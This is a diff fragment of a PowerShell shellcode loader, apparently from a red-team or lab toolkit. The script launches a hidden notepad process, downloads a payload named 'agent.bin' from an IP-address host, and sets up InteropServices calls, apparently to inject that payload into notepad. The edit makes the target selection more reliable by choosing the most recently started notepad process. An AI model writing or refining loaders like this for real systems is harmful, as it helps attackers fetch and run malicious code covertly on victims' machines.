@@ -6,7 +6,7 @@
 Start-Process notepad.exe -WindowStyle Hidden
 $url = "http://192.168.45.223/agent.bin"
 $shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-$procid = (Get-Process -Name notepad).Id
+$procid = (Get-Process -Name notepad | Sort-Object StartTime -Descending | Select-Object -First 1).Id
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
